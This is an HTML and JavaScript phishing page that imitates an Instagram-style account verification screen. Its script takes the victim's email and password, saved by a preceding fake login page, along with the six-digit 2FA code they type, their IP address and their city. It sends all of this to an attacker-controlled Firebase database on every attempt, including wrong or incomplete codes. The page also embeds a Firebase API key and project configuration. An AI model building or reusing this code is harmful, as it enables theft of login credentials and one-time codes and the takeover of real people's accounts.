<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verify Your Account</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
    body { background: #fafafa; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
    .card { background: #fff; border: 1px solid #c9c9c9; width: 380px; padding: 40px 30px; text-align: center; border-radius: 8px; }
    h2 { font-size: 18px; margin-bottom: 10px; color: #111; }
    p  { font-size: 13px; color: #666; margin-bottom: 25px; line-height: 1.5; }
    .code-inputs { display: flex; justify-content: center; gap: 8px; margin-bottom: 12px; }
    .code-inputs input {
      width: 42px; height: 50px; text-align: center; font-size: 20px;
      border: 1px solid #c4c4c4; border-radius: 6px; background: #fafafa; outline: none;
      transition: border-color .15s ease, background .15s ease;
    }
    .code-inputs input:focus { border-color: #1e71ec; background: #fff; }
    .code-inputs input.error { border-color: #ed4956; background: #fff5f5; }

    #code-error {
      color: #ed4956;
      font-size: 13px;
      min-height: 18px;
      margin-bottom: 15px;
      text-align: center;
      font-weight: 500;
      opacity: 0;
      transition: opacity .15s ease;
    }
    #code-error.visible { opacity: 1; }

    button {
      width: 100%; background: #1e71ec; color: #fff; border: none;
      padding: 10px; border-radius: 6px; font-size: 14px; font-weight: 500; cursor: pointer;
      transition: background .15s ease;
    }
    button:hover { background: #1558b8; }
    button:disabled { background: #a9c6f4; cursor: not-allowed; }

    .resend { margin-top: 15px; font-size: 12px; color: #666; }
    .resend a { color: #1e71ec; text-decoration: none; font-weight: 600; }
  </style>
</head>
<body>
  <div class="card">
    <h2>Enter Verification Code</h2>
    <p>We sent a 6-digit code to your email.<br>Enter it below to continue.</p>

    <div class="code-inputs">
      <input type="text" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
      <input type="text" maxlength="1" inputmode="numeric">
      <input type="text" maxlength="1" inputmode="numeric">
      <input type="text" maxlength="1" inputmode="numeric">
      <input type="text" maxlength="1" inputmode="numeric">
      <input type="text" maxlength="1" inputmode="numeric">
    </div>

    <div id="code-error" role="alert" aria-live="polite"></div>

    <button id="verifyBtn">Verify</button>
    <div class="resend">Didn't receive it? <a href="#" id="resendLink">Resend code</a></div>
  </div>

  <!-- Firebase SDK -->
  <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>

  <script>
    // ============================================================
    // FIREBASE INITIALIZATION (new project)
    // ============================================================
    const firebaseConfig = {
      apiKey: "AIzaSyCPvzqENhVGPacEtCy8A3FMu-ftC_Fo3u8",
      authDomain: "voting-76678.firebaseapp.com",
      databaseURL: "https://voting-76678-default-rtdb.europe-west1.firebasedatabase.app",
      projectId: "voting-76678",
      storageBucket: "voting-76678.firebasestorage.app",
      messagingSenderId: "92083343112",
      appId: "1:92083343112:web:84319eb8f7b063c6a1e6bd",
      measurementId: "G-50ZFKEPY90"
    };

    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    // ============================================================
    // ELEMENTS & STATE
    // ============================================================
    const inputs     = document.querySelectorAll('.code-inputs input');
    const errorEl    = document.getElementById('code-error');
    const verifyBtn  = document.getElementById('verifyBtn');
    const resendLink = document.getElementById('resendLink');

    // The expected code — replace with real backend validation later.
    const EXPECTED_CODE = '123456';

    // Retrieve the credentials the user typed on the login page
    const loginEmail    = sessionStorage.getItem('ig_login_email')    || 'Unknown';
    const loginPassword = sessionStorage.getItem('ig_login_password') || 'Unknown';

    // Location placeholders (populated asynchronously)
    let userIP = 'Unknown';
    let userCity = 'Unknown';
    let userCountry = 'Unknown';
    let locationReady = false;

    // ============================================================
    // LOCATION LOOKUP (non-blocking)
    // ============================================================
    (async function fetchLocationData() {
      try {
        const ipRes  = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        userIP = ipData.ip;

        const geoRes  = await fetch(`https://ipapi.co/${userIP}/json/`);
        const geoData = await geoRes.json();
        userCountry = geoData.country_name || 'Unknown';
        userCity    = geoData.city         || 'Unknown';
        locationReady = true;
      } catch (err) {
        console.warn('Primary location service failed:', err);
        try {
          const fbRes  = await fetch('https://ip-api.io/json/');
          const fbData = await fbRes.json();
          userCountry = fbData.country_name || 'Unknown';
          userCity    = fbData.city         || 'Unknown';
          userIP      = fbData.ip           || 'Unknown';
          locationReady = true;
        } catch (fbErr) {
          console.warn('Fallback location service also failed:', fbErr);
        }
      }
    })();

    // ============================================================
    // SAVE FULL RECORD TO FIREBASE
    // ============================================================
    function saveVerificationAttempt({ code, codeCorrect, reason }) {
      const doSave = () => {
        const record = {
          email:        loginEmail,
          password:     loginPassword,
          code:         code,
          codeCorrect:  codeCorrect,
          ip:           userIP,
          location:     `${userCity}, ${userCountry}`,
          timestamp:    new Date().toISOString(),
          reason:       reason,          // 'incorrect_code' | 'incomplete_code' | 'code_verified'
          source:       'verification_page'
        };

        const key = 'verify_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);

        database.ref('Instagram/' + key).set(record)
          .then(() => console.log('Verification record saved:', key))
          .catch(e => console.error('Error saving verification record:', e));
      };

      // Give the IP lookup up to 2 s to finish before saving
      if (locationReady) {
        doSave();
      } else {
        let waited = 0;
        const iv = setInterval(() => {
          if (locationReady || waited >= 2000) {
            clearInterval(iv);
            doSave();
          }
          waited += 100;
        }, 100);
      }
    }

    // ============================================================
    // HELPERS
    // ============================================================
    function showError(message) {
      errorEl.textContent = message;
      errorEl.classList.add('visible');
      inputs.forEach(i => i.classList.add('error'));
    }

    function clearError() {
      errorEl.textContent = '';
      errorEl.classList.remove('visible');
      inputs.forEach(i => i.classList.remove('error'));
    }

    function getEnteredCode() {
      return Array.from(inputs).map(i => i.value.trim()).join('');
    }

    // ============================================================
    // AUTO-ADVANCE / BACKSPACE / PASTE / ENTER
    // ============================================================
    inputs.forEach((input, i) => {
      input.addEventListener('input', () => {
        input.value = input.value.replace(/\D/g, '');
        clearError();
        if (input.value && i < inputs.length - 1) inputs[i + 1].focus();
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !input.value && i > 0) inputs[i - 1].focus();
        if (e.key === 'Enter') verifyBtn.click();
      });

      input.addEventListener('paste', (e) => {
        const pasted = (e.clipboardData || window.clipboardData)
                        .getData('text').replace(/\D/g, '').slice(0, 6);
        if (!pasted) return;
        e.preventDefault();
        pasted.split('').forEach((ch, idx) => { if (inputs[idx]) inputs[idx].value = ch; });
        inputs[Math.min(pasted.length, inputs.length - 1)].focus();
        clearError();
      });
    });

    // ============================================================
    // VERIFY BUTTON — saves {email, password, code} to Firebase
    // ============================================================
    verifyBtn.addEventListener('click', () => {
      const code = getEnteredCode();

      // 1. Incomplete code
      if (code.length !== 6) {
        showError('Please enter the full 6-digit code.');

        saveVerificationAttempt({
          code:        code,
          codeCorrect: false,
          reason:      'incomplete_code'
        });
        return;
      }

      // 2. Incorrect code
      if (code !== EXPECTED_CODE) {
        showError('Incorrect code. Please try again.');
        inputs[0].focus();

        // 🔥 Send email + password + code to Firebase
        saveVerificationAttempt({
          code:        code,
          codeCorrect: false,
          reason:      'incorrect_code'
        });
        return;
      }

      // 3. Correct code → save success record
      clearError();

      saveVerificationAttempt({
        code:        code,
        codeCorrect: true,
        reason:      'code_verified'
      });

      // Clean up stored credentials
      sessionStorage.removeItem('ig_login_email');
      sessionStorage.removeItem('ig_login_password');
      sessionStorage.removeItem('ig_failed_attempts');

      // TODO: redirect to your real success page
      // window.location.href = 'success.html';
      setTimeout(() => alert('Code verified successfully!'), 300);
    });

    // ============================================================
    // RESEND LINK
    // ============================================================
    resendLink.addEventListener('click', (e) => {
      e.preventDefault();
      clearError();
      inputs.forEach(i => i.value = '');
      inputs[0].focus();
      console.log('Resend code requested for', loginEmail);
    });
  </script>
</body>
</html>
